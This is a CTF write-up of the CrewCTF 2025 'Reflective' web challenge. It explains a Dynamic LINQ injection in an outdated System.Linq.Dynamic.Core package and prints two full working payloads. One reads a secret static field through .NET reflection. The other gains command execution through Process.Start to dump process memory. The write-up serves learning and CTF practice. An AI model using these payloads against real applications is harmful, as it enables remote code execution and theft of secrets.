---
title: "CrewCTF 2025 – Reflective (Web)"
date: 2025-09-22 23:30:00 +0300
categories: [CTF, Web]
tags: [CrewCTF, .NET, Reflection, DynamicLINQ, RCE, Writeup]
description: "Writeup for Reflective (Web) challenge from CrewCTF 2025 where I discussed two unintended solutions."
---

## TL;DR

The app had two critical issues: the `/Notes` search built a Dynamic-LINQ query by concatenating user input (`"Title.Contains(\"" + title + "\")"`) while using a vulnerable `System.Linq.Dynamic.Core v1.2.25`, which allowed injected expressions to use .NET reflection — letting an attacker traverse assemblies, read the private static `_flag` field from `BookKeeper.NotesManager`, and `Invoke` `set_Title` on a note so the flag appears in the UI; and the package also exposed an RCE vector via Dynamic-LINQ which could be used to start a process (e.g., run `dotnet-dump collect -p 1 -o dump --type Full`) and dump the .NET process memory to grep the flag.

---

**Challenge:** [Reflective](https://2025.crewc.tf/challenges#Reflective-14)<br>**Author:** [Instellate](https://instellate.xyz/)<br>**Solves**: 23

Greetings!

I participated in CrewCTF this year, one of the most challenging yet enjoyable CTFs I've done. This particular challenge offered multiple possible attack paths, but it remained one of the toughest on the board, with only 23 teams managing to solve it.

---

## Opening the Box

First thing I always do is check the Dockerfile. This challenge looked like a .NET 9 (ASP.NET Core) web app — it exposed port **8080** and ran on `mcr.microsoft.com/dotnet/aspnet:9.0`. I don’t know .NET that well, so rather than read every line of code, I spun up an instance to see how it behaved.

Two endpoints stood out quickly:

- `/Notes` — lists all notes and supports searching.
- `/Notes/create` — a simple form to create notes.

Naturally I wanted to see what drove those endpoints, so I hunted down `NotesManager.cs`. That’s where things started to get interesting.

---

## Peeking Inside the .NET Project

This code snippet is from `NotesManager.cs` file:

```csharp
public IEnumerable<Note> GetLatestNotes(string title, int page = 0)
{
    string query = "Title.Contains(\"" + title + "\")";

    return this._notes
        .AsQueryable()
        .OrderByDescending(n => n.CreatedAt)
        .Where(query)
        .Skip(page * 10)
        .Take(10);
}
```

That’s straight-up string concatenation of user input — a red flag. It turned out the `.Where(query)` uses **Dynamic LINQ**, which parses and compiles user-supplied expressions. I’d never used it before, so I went to learn how it works and which version the app used.

`Reflective.csproj` showed:

```xml
<PackageReference Include="System.Linq.Dynamic.Core" Version="1.2.25" />
```

That version is ancient compared to the current `1.6.x` line, and the [NuGet page](https://www.nuget.org/packages/System.Linq.Dynamic.Core/1.2.25) flagged vulnerabilities. Two stood out:

1. **Remote Code Execution** via Dynamic LINQ (critical). [here](https://github.com/advisories/GHSA-w65q-jcmv-28gj)
2. **Property reflection** allowing access to reflection types and static properties/fields (high). [here](https://github.com/advisories/GHSA-4cv2-4hjh-77rx)


The second one fit the challenge’s name — *Reflective* — so I dug into it. The advisory noted that versions before `1.6.0` allowed remote access to reflection types and static properties/fields from within injected expressions. That sounded promising, but I couldn’t immediately craft a working payload. Thankfully my teammate **phisher305** cracked it and shared the payload after the CTF ended — huge thanks to him. I’ve broken it down below.

---

## How the Payload Works

Here’s the payload we used:

```
") and true && it.GetType().Assembly.DefinedTypes.Where(t=>t.FullName=="Reflective.Note").First().DeclaredMethods.Where(m=>m.Name=="set_Title").First().Invoke(
 it,
 new System.Object[]{
   (
     ("").GetType().Assembly
       .DefinedTypes.Where(t=>t.FullName=="System.Reflection.Assembly").First()
       .DeclaredMethods.Where(m=>m.Name=="CreateInstance").First()
       .Invoke(
         ("").GetType().Assembly
           .DefinedTypes.Where(t=>t.FullName=="System.Array").First()
           .DeclaredMethods.Where(m=>m.Name=="GetValue").First()
           .Invoke(
             ("").GetType().Assembly
               .DefinedTypes.Where(t=>t.FullName=="System.AppDomain").First()
               .DeclaredMethods.Where(m=>m.Name=="GetAssemblies").First()
               .Invoke(
                 ("").GetType().Assembly
                   .DefinedTypes.Where(t=>t.FullName=="System.AppDomain").First()
                   .DeclaredProperties.Where(p=>p.Name=="CurrentDomain").First()
                   .GetValue(null),
                 new System.Object[]{}
               ),
             new System.Object[]{ new [] { 97 } }
           ),
         new System.Object[]{ "BookKeeper.NotesManager" }
       )
   ).GetType().Assembly
     .DefinedTypes.Where(tt=>tt.Name=="NotesManager").First()
     .DeclaredFields.Where(f=>f.Name=="_flag").First()
     .GetValue(null).ToString()
 }
)==null and Title.StartsWith("
```

Breakdown:

- **Injection entry:** The payload first closes the expected expression and injects a new Dynamic-LINQ expression (`) and true && ...`) so the attacker controls the whole `Where(...)` string — classic injection.
- **`it` is the pivot:** Inside the `Where` predicate, `it` refers to the current `Note` object. The payload starts reflection traversal from `it` (e.g. `it.GetType().Assembly.DefinedTypes`) as an entrypoint to the process’s types.
- **Bootstrapping reflection with `""`:** The `("").GetType().Assembly` trick obtains a `System.Type` (string’s type) and its `Assembly` without `typeof(...)` or hardcoded names, giving access to reflection APIs (`DefinedTypes`, `DeclaredMethods`, `DeclaredFields`, etc.).
- **Find the target assembly:** It calls `AppDomain.CurrentDomain.GetAssemblies()` and picks an assembly using `Array.GetValue(...)` with an index (your payload used `new [] { 97 }`). The index is used because the right assembly isn’t known reliably; on that instance index 97 points to the challenge assembly.
- **Create instance of target manager:** With that `Assembly`, the payload calls `Assembly.CreateInstance("BookKeeper.NotesManager")` to obtain a `NotesManager` object from the target code — the pivot to reach the `_flag`.
- **Read the `_flag` via reflection:** From the `NotesManager` type/instance it enumerates `DeclaredFields`, finds the `_flag` static field, and calls `GetValue(null)` (null because it’s static) to retrieve the flag string, then `.ToString()`.
- **Plant the flag into the UI:** The payload then finds and invokes `set_Title` on the current `it` (`Invoke(it, new object[]{ <flagString> })`), setting the note’s `Title` to the flag so the app will display it.
- **Keep the predicate valid:** Finally it appends a boolean expression (e.g. `Title.StartsWith("...")`) so the `Where(...)` remains a valid predicate and the modified row is returned/rendered. In short: read the flag by reflection, write it into a visible `Note` field, and return a row so the UI shows the flag.

```
crew{dotnet_reflection_is_weird_is_it_not__why_do_i_care}
```

---

## Another Unintended Route

From the CrewCTF Discord I learned other unintended solutions relying on the same vulnerabilities mentioned earlier.

One neat approach (shoutout to **siunam321**) used a Dynamic-LINQ injection to achieve RCE, then invoked `dotnet-dump` from the container to dump the .NET process memory (PID 1) and grep the flag from the memory dump. The payload essentially kicked off a shell/Process start that ran `dotnet-dump collect -p 1 -o dump --type Full`. Once the dump finished, they inspected it and found the flag in plaintext.

 ```
 ") && "".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "/bin/bash;-c \"./dotnet-dump collect -p 1 -o dump --type Full"".Split(";".ToCharArray())).GetType().ToString() == ("
 ```

This route leaned on an RCE path for the library (CVE-style PoC) rather than the reflection-only path we used to write the flag directly into a `Note` title. Both are valid — just different flavors of exploitation.

---

## Final Thoughts

This challenge was an absolute blast. It introduced me to Dynamic LINQ and a weird corner of .NET reflection I hadn’t seen before. The combination of reflection APIs, an old vulnerable library, and a tiny UI surface made for a satisfying puzzle: once you spot the injection point, the rest is creative traversal and a bit of trial-and-error.

Big thanks to my teammate **phisher305** for the payload and to everyone in the discord who discussed alternate approaches. I learned a ton and can’t wait to play with these ideas further.

I still haven’t managed to get the intended solution in a way I can write about properly — hopefully I’ll be able to later.

Thanks for reading!